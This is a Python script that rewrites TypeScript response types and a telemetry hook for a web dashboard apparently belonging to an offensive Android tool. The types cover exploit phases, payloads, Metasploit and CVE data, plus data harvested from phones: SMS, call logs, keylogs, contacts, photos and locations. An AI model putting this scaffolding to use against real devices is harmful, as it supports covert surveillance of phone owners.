#!/usr/bin/env python3
"""Rewrite types.ts from the compiler's own error list, and fix useTelemetry."""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

WEB = Path("pegasus/ui/web")
LIB = WEB / "src" / "lib"

TYPES = r'''/** Shared response types for the Pegasus web GUI.
 *
 *  Shapes are derived from what the pages read, so most fields are optional.
 *  Index signatures are present where a page casts to Record<string, unknown>.
 */

export type Phase =
  | "queued"
  | "running"
  | "succeeded"
  | "failed"
  | "cancelled"
  | "done"
  | "discover"
  | "triage"
  | "craft"
  | "deliver"
  | "listen"
  | "post"
  | "notify"
  | "deciding";

export interface Job {
  id: string;
  kind?: string;
  title?: string;
  status?: Phase;
  progress?: number;
  createdAt?: number;
  startedAt?: number | null;
  finishedAt?: number | null;
  durationMs?: number | null;
  error?: string | null;
  output?: string;
  cancelRequested?: boolean;
  meta?: Record<string, unknown>;
  result?: unknown;
  [key: string]: unknown;
}

export interface Run {
  id: string;
  kind?: string;
  status?: Phase;
  phase?: Phase;
  targets?: string[];
  log?: string[];
  startedAt?: number;
  finishedAt?: number | null;
  result?: unknown;
  [key: string]: unknown;
}

export interface Environment {
  hostname?: string;
  localIp?: string;
  python?: string;
  platform?: string;
  pid?: number;
  cwd?: string;
  [key: string]: unknown;
}

export interface WorkspaceInfo {
  workspace?: string;
  database?: string;
  databasePath?: string;
  reportsDir?: string;
  payloadsDir?: string;
  logsDir?: string;
  metasploit?: string;
  version?: string;
  aiConfigured?: boolean;
  aiModel?: string;
  [key: string]: unknown;
}

export interface ComponentStatus {
  key?: string;
  label?: string;
  status?: string;
  detail?: string;
  [key: string]: unknown;
}

export interface SystemInfo {
  host?: string;
  platform?: string;
  python?: string;
  adb?: boolean;
  workspace?: WorkspaceInfo;
  environment?: Environment;
  components?: ComponentStatus[];
  health?: HealthInfo;
  plugins?: number;
  commands?: number;
  version?: string;
  uptimeSeconds?: number;
  [key: string]: unknown;
}

export interface HealthInfo {
  status: string;
  detail?: string;
  uptimeSeconds?: number;
  [key: string]: unknown;
}

export interface DeviceRecord {
  serial: string;
  model?: string;
  manufacturer?: string;
  androidVersion?: string;
  apiLevel?: number;
  sdk?: number;
  state?: string;
  transport?: string;
  isNetwork?: boolean;
  isRooted?: boolean;
  root?: boolean;
  batteryLevel?: number;
  label?: string | null;
  [key: string]: unknown;
}

export interface DeviceNotes {
  label?: string | null;
  group?: string | null;
  notes?: string | null;
  [key: string]: unknown;
}

export interface DeviceDetail extends DeviceRecord {
  patchLevel?: string;
  securityPatch?: string;
  buildId?: string;
  buildType?: string;
  buildTags?: string;
  abi?: string;
  device?: string;
  battery?: number;
  storageFree?: number | null;
  storageTotal?: number | null;
  fingerprint?: unknown;
  properties?: Record<string, unknown>;
  notes?: DeviceNotes | string | null;
}

export interface DashboardSummary {
  devices?: number;
  jobs?: number;
  findings?: number;
  listeners?: number;
  health?: HealthInfo;
  summary?: { counts?: Record<string, number> };
  [key: string]: unknown;
}

export interface CommandInfo {
  name: string;
  plugin: string;
  description: string;
  aliases: string[];
  [key: string]: unknown;
}

export interface SlashCommandInfo {
  name: string;
  usage?: string;
  description?: string;
  category?: string;
  enabled?: boolean;
  [key: string]: unknown;
}

export interface ToolStatus {
  key: string;
  available: boolean;
  version?: string;
  path?: string;
  label?: string;
  required?: string;
  purpose?: string;
  [key: string]: unknown;
}

export interface WorkflowStage {
  name?: string;
  status?: string;
  output?: string;
  [key: string]: unknown;
}

export interface WorkflowHistoryEntry {
  id?: string;
  run_id?: string;
  workflow?: string;
  target?: string;
  category?: string;
  status?: Phase;
  overall_success?: boolean;
  start_time?: string | number;
  total_duration_ms?: number;
  stages?: WorkflowStage[];
  startedAt?: number;
  finishedAt?: number | null;
  [key: string]: unknown;
}

export interface CveEntry {
  id: string;
  cve?: string;
  title?: string;
  severity?: string;
  cvss?: number;
  affected_api_min?: number;
  affected_api_max?: number;
  patch_level?: string;
  description?: string;
  component?: string;
  impact?: string;
  reliability?: string;
  sdkMax?: number;
  patchBefore?: string;
  status?: string;
  [key: string]: unknown;
}

export interface CampaignRow {
  id?: string;
  campaign_id?: string;
  name: string;
  client?: string;
  status?: string;
  targets?: number;
  target_count?: number;
  created_at?: string | number;
  createdAt?: number;
  [key: string]: unknown;
}

export interface EventRow {
  id: string | number;
  at: string | number;
  level?: string;
  kind: string;
  title: string;
  detail?: string;
  [key: string]: unknown;
}

export interface ListenerRow {
  host: string;
  port: number;
  open: boolean;
  service?: string;
  [key: string]: unknown;
}

export interface ReportFile {
  name: string;
  format?: string;
  sizeBytes?: number;
  createdAt?: number;
  url?: string;
  [key: string]: unknown;
}

export interface PayloadFile {
  name: string;
  path?: string;
  extension?: string;
  sizeBytes?: number;
  kind?: string;
  createdAt?: number;
  [key: string]: unknown;
}

export interface PluginInfo {
  name: string;
  version?: string;
  enabled?: boolean;
  initialized?: boolean;
  category?: string;
  author?: string;
  tags?: string[];
  commands?: number[];
  components?: number[];
  description?: string;
  [key: string]: unknown;
}

export interface Keyword {
  id: number;
  deviceSerial?: string;
  keyword: string;
  hitCount?: number;
  lastHitAt?: string | null;
  createdAt?: string | null;
  [key: string]: unknown;
}

export interface KeywordHit {
  id: number;
  keyword: string;
  matches: { source: string; text: string }[];
  matchCount: number;
  [key: string]: unknown;
}

export interface PhotoRow {
  id: number;
  name: string;
  url?: string;
  thumbnailUrl?: string;
  sizeBytes?: number;
  mimeType?: string;
  takenAt?: string;
  [key: string]: unknown;
}

export interface VideoRow extends PhotoRow {
  durationSeconds?: number;
}

export interface AppRow {
  id: number;
  name: string;
  packageName: string;
  path?: string;
  version?: string;
  system?: boolean;
  [key: string]: unknown;
}

export interface BrowserRow {
  id: number;
  url: string;
  title: string;
  visitCount?: number;
  lastVisitedAt?: string | null;
  [key: string]: unknown;
}

export interface CallRow {
  id: number;
  callType: string;
  name: string;
  phone: string;
  durationSeconds: number;
  calledAt: string;
  [key: string]: unknown;
}

export interface ContactRow {
  id: number;
  name: string;
  phones: string[];
  emails: string[];
  [key: string]: unknown;
}

export interface SmsRow {
  id: number;
  address: string;
  body: string;
  direction: "incoming" | "outgoing";
  type?: string;
  read: boolean;
  sentAt: string;
  [key: string]: unknown;
}

export interface KeylogRow {
  id: number;
  app: string;
  text: string;
  recordedAt: string;
  [key: string]: unknown;
}

export interface LocationRow {
  id: number;
  lat: number;
  lng: number;
  address: string;
  city?: string | null;
  source?: string;
  recordedAt?: string | null;
  [key: string]: unknown;
}

export interface WifiRow {
  id: number;
  ssid: string;
  bssid?: string | null;
  isConnected: boolean;
  lastSeenAt?: string | null;
  [key: string]: unknown;
}

export interface ActivityRow {
  id: number;
  app: string;
  durationSeconds: number;
  startedAt?: string | null;
  [key: string]: unknown;
}

export interface Geofence {
  id: number;
  deviceSerial?: string;
  name: string;
  lat: number;
  lng: number;
  radiusMeters: number;
  isActive: boolean;
  createdAt?: string | null;
  [key: string]: unknown;
}

export interface ChannelHealth {
  state: "ok" | "link-only" | "off" | string;
  reason?: string;
  [key: string]: unknown;
}

export interface Receipt {
  ts: number;
  channel: string;
  target: string;
  via: string;
  ref?: string | null;
  error?: string | null;
  [key: string]: unknown;
}

export interface TelemetrySample<T> {
  rows: T[];
  collectedAt?: number | null;
}
'''

TELEMETRY = r'''/** Device telemetry hook: reads the latest sample, triggers collection. */
import { useCallback, useEffect, useRef } from "react";
import { api, useApi } from "@/lib/api";
import { useApp } from "@/state/AppContext";

const BURST_DELAYS = [600, 1200, 2400];

/** T is the sample body itself, e.g. { rows: CallRow[] }. */
export interface UseTelemetryResult<T> {
  data: T | null;
  loading: boolean;
  error: Error | null;
  refresh: () => void;
  collect: () => Promise<void>;
  serial: string | null;
  burst: () => void;
}

export function useTelemetry<T>(kind: string, ttl = 30_000): UseTelemetryResult<T> {
  const { activeSerial } = useApp() as { activeSerial: string | null };
  const serial = activeSerial ?? null;
  const timers = useRef<number[]>([]);

  const path = serial ? `/devices/${encodeURIComponent(serial)}/telemetry/${kind}` : null;
  const { data, loading, error, refresh } = useApi<T>(path, {
    interval: ttl,
    enabled: Boolean(serial),
    deps: [serial, kind],
  });

  const clearTimers = useCallback(() => {
    for (const timer of timers.current) window.clearTimeout(timer);
    timers.current = [];
  }, []);

  useEffect(() => clearTimers, [clearTimers, serial, kind]);

  const burst = useCallback(() => {
    clearTimers();
    for (const delay of BURST_DELAYS) {
      timers.current.push(window.setTimeout(() => refresh(), delay));
    }
  }, [clearTimers, refresh]);

  const collect = useCallback(async () => {
    if (!serial) return;
    await api.post(`/devices/${encodeURIComponent(serial)}/telemetry/${kind}/collect`);
    refresh();
  }, [serial, kind, refresh]);

  return { data, loading, error, refresh, collect, serial, burst };
}

export default useTelemetry;
'''


def main() -> int:
    if not (WEB / "src" / "pages").is_dir():
        print("run from the repo root"); return 1

    (LIB / "types.ts").write_text(TYPES, encoding="utf-8")
    print(f"  wrote types.ts ({len(TYPES.splitlines())} lines)")
    (LIB / "useTelemetry.ts").write_text(TELEMETRY, encoding="utf-8")
    print("  rewrote useTelemetry.ts (T is now the sample body)")

    print("\ntypecheck")
    code = subprocess.call("npx tsc --noEmit", cwd=str(WEB), shell=True)
    if code != 0:
        print("\nstill failing — not committing")
        return 2
    print("  clean")

    subprocess.call("git add -A", cwd=str(Path.cwd()), shell=True)
    subprocess.call(
        'git commit -m "web: restore src/lib, add supplementary device routes, fix series" '
        '-m "Types derived from page usage; useTelemetry T is the sample body. '
        'Sweeps 5.1 5.3 7.1 7.2 8.1 8.2 8.3 10.1 12.3."',
        cwd=str(Path.cwd()), shell=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())